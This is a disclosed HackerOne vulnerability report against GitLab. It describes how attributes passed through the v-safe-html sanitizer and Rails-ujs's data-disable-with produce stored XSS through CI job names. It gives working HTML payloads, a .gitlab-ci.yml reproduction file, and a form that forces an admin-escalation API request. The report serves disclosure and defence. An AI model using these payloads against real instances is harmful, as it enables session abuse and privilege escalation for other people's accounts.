# XSS: `v-safe-html` is not safe enough

## Report Details
- **Report ID**: 1579645
- **URL**: https://hackerone.com/reports/1579645
- **State**: Closed
- **Severity**: high
- **Submitted**: 2022-05-24T10:29:44.956Z
- **Disclosed**: 2022-11-16T01:08:16.508Z

## Reporter
- **Username**: yvvdwf
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: gitlab

## Vulnerability Information
`v-safe-html` directive uses Dompurify [to remove](https://gitlab.com/gitlab-org/gitlab-ui/-/blob/9f1bcb1f7392d4d6d072f10197c2aab2c29c3287/src/directives/safe_html/constants.js#L3)  `data-remote', 'data-url', 'data-type', 'data-method'` attributes from HTML tags. Rails-js relies on another attribute, [`data-disable-with`](https://github.com/rails/rails/blob/v6.1.4.7/actionview/app/assets/javascripts/rails-ujs.coffee#L10) to [show a HTML content](https://github.com/rails/rails/blob/v6.1.4.7/actionview/app/assets/javascripts/rails-ujs/features/disable.coffee#L41) when an user clicks on a disabled link.

For example, the following text will bypass the sanitization and popup an alert when an user clicks on the link (which is a transparent topmost layer since the sanitization allows also `style` and `class` attributes):

```html
<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">'
```

An exploitation can be done via [jobs' error messages](https://gitlab.com/gitlab-org/gitlab/-/blob/38af35c2a4aa666f914484d3f119b813651a2041/app/assets/javascripts/jobs/components/job_app.vue#L215) which contain [CI job names](https://gitlab.com/gitlab-org/gitlab/-/blob/7f86b5b78c107f7124b54e1f797099741765b3d2/app/serializers/build_details_entity.rb#L154) which are provided by users.



### Steps to reproduce

1. In an existing project or create a new one, add `.gitlab.ci` file with the following content:

```yaml
'1. XSS when no CSP<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">':
  stage: build
  script: echo "hi"

'2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class="fixed-top fixed-bottom text-hide cursor-default" style="font-size:10000px" value=Submit>':
  stage: build
  script: echo "hi"

trigger-xss:
  stage: test
  script: echo "hi"
  dependencies:
    - '1. XSS when no CSP<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">'
    - '2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class="fixed-top fixed-bottom text-hide cursor-default" style="font-size:10000px" value=Submit>'
```

2. Go to `CI/CD`/`Jobs` tab and wait for the CI jobs finished

3. If you are testing on a local instance without CSP protection, click on detail of the job `1. XSS when no CSP<a class="fixed-top fixed-bottom text-hide gl-font-size-42 cursor-default" href=# data-disable-with="<img src=x onerror=alert(document.domain)>">`, then click on the trash button on the right literal bar to `Erase job logs and artifacts`.

3. Go back to the job list, click on `trigger-xss` link to view the detail of this job. Then click on `Retry` button on the right literal bar to retry the job.

4. An error message appears: `This job could not start because it could not retrieve the needed artifacts: 1. XSS when no CSP`. Click anywher to trigger the alert

Note: on gitlab.com or an instance having CSP protection (with `strict-dynamic` value of `script-src`), the inline script, such as `onerror` or the [`<iframe srcdoc='<script src=https://gitlab.com/yvvdwf/data/-/jobs/552156057/artifacts/raw/alert.js></script>'></iframe>`](https://gitlab.com/gitlab-org/gitlab/-/issues/233473), will be prevented to trigger. In such a case, we may use `<form>` tag to trigger arbitrary API requests on behalf of the user, for example, this allows escalate to admin permission when administrator *click anywhere* `2. Admin escalation when having CSP<form action=/api/v4/users/5212593?_method=PUT&admin=true method=post><input type=submit class="fixed-top fixed-bottom text-hide cursor-default" style="font-size:10000px" value=Submit>`

### Impact

XSS allow attackers to perform arbitrary actions on behalf of victims at client side.

### Examples

https://gitlab.com/yvvdwf/xss-in-job-dependencies/-/jobs/2498306483

https://gitlab.com/yvvdwf/xss-in-job-dependencies/-/jobs/2498287882

### Output of checks

This bug happens on GitLab.com

## Impact

XSS allow attackers to perform arbitrary actions on behalf of victims at client side.

## Attachments
No attachments
